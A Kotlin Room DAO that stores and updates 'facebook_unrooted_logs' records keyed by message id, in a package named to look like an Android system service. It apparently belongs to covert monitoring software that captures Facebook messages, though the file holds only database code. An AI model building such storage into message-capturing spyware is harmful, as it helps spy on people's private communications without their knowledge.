package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.FacebookUnrooted

@Dao
interface FacebookUnrootedDao {
    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(facebookUnrooted: FacebookUnrooted)

    @Query("SELECT uniqueId from facebook_unrooted_logs where uniqueId = :messageId")
    fun checkIfAlreadyExist(messageId:String):String?

    @Query("SELECT * from facebook_unrooted_logs where status = :status")
    fun selectAllFacebookUnrootedLogs(status:Int):List<FacebookUnrooted>

    @Query("UPDATE facebook_unrooted_logs set status = :updated_status where id between :startId and :endId")
    fun update(startId:Int , endId:Int,updated_status:Int):Int

}